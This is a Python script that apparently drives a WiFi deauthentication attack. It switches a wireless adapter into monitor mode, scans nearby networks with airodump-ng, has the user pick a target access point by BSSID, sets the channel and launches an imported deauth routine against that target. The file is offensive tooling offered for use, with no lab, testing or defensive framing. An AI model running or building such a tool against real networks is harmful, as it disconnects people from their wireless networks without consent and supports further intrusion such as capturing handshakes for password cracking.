import subprocess
import time
import csv
import re
import os

from helpers.adapter import set_monitor_mode, start_channel
from helpers.utils import clear_csv_backup, is_sudo
from modules.deauth import run_deauth_attack

active_wireless_networks = []

def check_for_essid(essid, lst):
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True

def choose_interface():
    wlan_pattern = re.compile("^wlan[0-9]+")
    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print("Please connect a WiFi adapter and try again.")
        exit()

    print("The following WiFi interfaces are available:")
    for index, item in enumerate(check_wifi_result):
        print(f"{index} - {item}")

    while True:
        wifi_interface_choice = input("Select interface: ")
        try:
            return check_wifi_result[int(wifi_interface_choice)]
        except:
            print("Invalid choice. Try again.")

def scan_networks(interface):
    discover = subprocess.Popen(["airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", interface],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy',
                                      'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length',
                                      'ESSID', 'Key']
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] in ["BSSID", "Station MAC"]:
                                continue
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
            print("Scanning. Press Ctrl+C when ready to choose a network.
")
            print("No |	BSSID              |	Channel|	ESSID")
            print("___|	___________________|	_______|	______________________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}	{item['BSSID']}	{item['channel'].strip()}		{item['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("
Scan complete.")

def choose_target():
    while True:
        choice = input("Select target number: ")
        try:
            return active_wireless_networks[int(choice)]
        except:
            print("Invalid choice. Try again.")

def main():
    if not is_sudo():
        print("Please run this program with sudo.")
        exit()

    clear_csv_backup()
    interface = choose_interface()
    set_monitor_mode(interface)
    scan_networks(interface)
    target = choose_target()
    bssid = target["BSSID"]
    channel = target["channel"].strip()

    start_channel(interface, channel)
    run_deauth_attack(bssid, interface)

if __name__ == "__main__":
    main()
